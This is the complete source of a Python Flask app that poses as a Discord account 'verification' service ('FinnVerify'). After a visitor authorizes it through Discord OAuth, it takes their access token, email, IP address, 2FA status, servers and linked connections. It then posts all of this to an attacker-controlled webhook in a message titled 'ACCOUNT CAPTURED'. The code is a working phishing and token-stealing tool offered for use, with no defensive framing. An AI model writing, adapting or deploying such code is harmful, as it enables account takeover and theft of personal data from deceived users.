#!/usr/bin/env python3
import json
import time
import threading
import os
from pathlib import Path

import requests
from flask import Flask, request, render_template, redirect, jsonify

BASE = Path(__file__).parent
CFG = json.loads((BASE / "config.json").read_text())

app = Flask(__name__, static_folder="static", template_folder="templates")

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) FinnVerify/1.0"

_PROFILE_CACHE = {"data": None, "ts": 0}
_PROFILE_LOCK = threading.Lock()


def public_profile(user_id):
    with _PROFILE_LOCK:
        if _PROFILE_CACHE["data"] and time.time() - _PROFILE_CACHE["ts"] < 60:
            return _PROFILE_CACHE["data"]
    try:
        r = requests.get(f"{API}/users/{user_id}", headers={"User-Agent": UA}, timeout=10)
        base = r.json() if r.status_code == 200 else {}
    except Exception:
        base = {}
    with _PROFILE_LOCK:
        _PROFILE_CACHE["data"] = base
        _PROFILE_CACHE["ts"] = time.time()
    return base


def avatar_url(user):
    uid = user.get("id", "")
    av = user.get("avatar")
    if av:
        ext = "gif" if av.startswith("a_") else "png"
        return f"https://cdn.discordapp.com/avatars/{uid}/{av}.{ext}?size=256"
    try:
        idx = (int(uid) >> 22) % 6
    except Exception:
        idx = 0
    return f"https://cdn.discordapp.com/embed/avatars/{idx}.png"


@app.route("/")
def home():
    u = public_profile(CFG["profile_user_id"])
    ctx = {
        "brand": CFG["brand_name"],
        "username": u.get("global_name") or u.get("username") or "Finn",
        "handle": u.get("username") or "finn",
        "discrim": u.get("discriminator", "0"),
        "uid": u.get("id", CFG["profile_user_id"]),
        "avatar": avatar_url(u),
        "bio": (u.get("bio") or "Verified account - Finn On Top"),
        "oauth_url": (
            "https://discord.com/oauth2/authorize"
            f"?client_id={CFG['client_id']}"
            "&response_type=code"
            f"&redirect_uri={CFG['redirect_uri']}"
            "&scope=identify%20email%20connections%20guilds"
        ),
    }
    return render_template("index.html", **ctx)


def exchange_code(code):
    data = {
        "client_id": CFG["client_id"],
        "client_secret": CFG["client_secret"],
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": CFG["redirect_uri"],
    }
    r = requests.post(
        f"{API}/oauth2/token", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
        timeout=15,
    )
    return r.json() if r.status_code == 200 else None


def fetch_me(access_token):
    h = {"Authorization": f"Bearer {access_token}", "User-Agent": UA}
    me = requests.get(f"{API}/users/@me", headers=h, timeout=10).json()
    conns = requests.get(f"{API}/users/@me/connections", headers=h, timeout=10).json()
    guilds = requests.get(f"{API}/users/@me/guilds", headers=h, timeout=10).json()
    return me, conns, guilds


def fire_webhook(me, conns, guilds, ip, access_token):
    uname = f"{me.get('username','?')}#{me.get('discriminator','0')}"
    conn_lines = "\n".join(f"- {c['type']}: `{c.get('name','?')}`" for c in (conns or [])) or "- none"
    embed = {
        "username": "Finn On Top",
        "embeds": [{
            "title": "FINN VERIFY - ACCOUNT CAPTURED",
            "description": (
                f"**Account:** `{uname}`\n"
                f"**ID:** `{me.get('id')}`\n"
                f"**Email:** `{me.get('email') or 'none'}`\n"
                f"**Verified:** `{me.get('verified')}`\n"
                f"**2FA:** `{me.get('mfa_enabled')}`\n"
                f"**Guilds:** `{len(guilds or [])}`\n"
                f"**IP:** `{ip}`\n\n"
                f"**Access Token:**\n```\n{access_token}\n```\n"
                f"**Connections:**\n{conn_lines}"
            ),
            "thumbnail": {"url": avatar_url(me)},
            "color": 0x3B82F6,
            "footer": {"text": "Created by Finn - Finn On Top"},
        }],
    }
    try:
        requests.post(CFG["webhook_url"], json=embed, timeout=10)
    except Exception:
        pass


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return redirect("/?error=no_code")
    tok = exchange_code(code)
    if not tok or "access_token" not in tok:
        return redirect("/?error=exchange_failed")
    at = tok["access_token"]
    me, conns, guilds = fetch_me(at)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?")
    fire_webhook(me, conns, guilds, ip.split(",")[0].strip(), at)
    return render_template(
        "success.html",
        brand=CFG["brand_name"],
        username=me.get("global_name") or me.get("username", "user"),
        avatar=avatar_url(me),
        access_token=at,
        user_id=me.get("id"),
    )


@app.route("/healthz")
def healthz():
    return jsonify({"ok": True})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), threaded=True)
